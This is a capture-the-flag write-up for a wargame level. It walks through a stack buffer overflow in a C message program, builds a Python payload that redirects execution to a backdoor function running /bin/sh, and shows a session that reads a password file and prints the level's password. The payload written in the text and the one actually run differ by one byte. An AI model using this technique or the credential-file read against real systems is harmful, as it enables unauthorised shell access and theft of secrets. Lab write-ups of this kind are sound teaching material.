In that program we have the `handle_msg` function, which have 3 variables:
```c
void handle_msg(void)
{
	char c;				// rbp-12
	char ptr[40];		// rbp-52
	char username[140]; // rbp-192
```
We can override their return address after 200 bytes of padding
(192 bytes for the variables, 8 for RBP).

We first fill the `username` buffer with the user `username`, and then with the message
```c
set_username(username);
set_msg(username);
```

On the `set_username` function, we can see that we are writing 40 bytes from the 140th one:
```c
while (res <= 40 && buff[res] != '\0')
{
	*(username + 140 + res) = buff[res];
	res++;
}
```

And then, in the `set_msg` function, we are copying the buff with the number stored in `message[180]` (that we control)
amount of bytes to the message pointer. This will help us to copy again up to 255 characters
and makes the variable overflow.
```c
void set_msg(char *message)
{					 // rbp-1032
	char buff[1024]; // rbp-1024

	bzero(buff, 128);
	puts(">: Msg @Unix-Dude");
	printf(">>: ");
	fgets(buff, 1024, stdin);
	strncpy(message, buff, message[180]);
}
```

Finally, we have a `secret_backdoor` function that we need to call to execute whatever the command is.

Now, we need the address of the `secret_backdoor` function.

```
(gdb) p secret_backdoor 
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

Let's craft a payload. First, we need 39 letters of padding,
and one to set the good size we want in out final buffer.

Then, we need our buffer that'll be filled with a padding (200 bytes),
and thee return address (8 bytes).

We need to makes the `fgets` stop reading the `stdin`
by putting a `\n` to the payload.

And finally, for the `secret_backdoor` function, we need to
pass the `/bin/sh` string.

Okay, so for all of that, we need 208 bytes, so the 40th character will be `208`.

Payload:
```py
print("A" * 39 + chr(208) + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00\n/bin/sh")
```

The address had only 6 characters, so I added 2 `\x00` of padding.

```sh
level09@OverRide:~$ (python -c 'print("A" * 40 + chr(208) + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00\n/bin/sh")
'; cat -) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```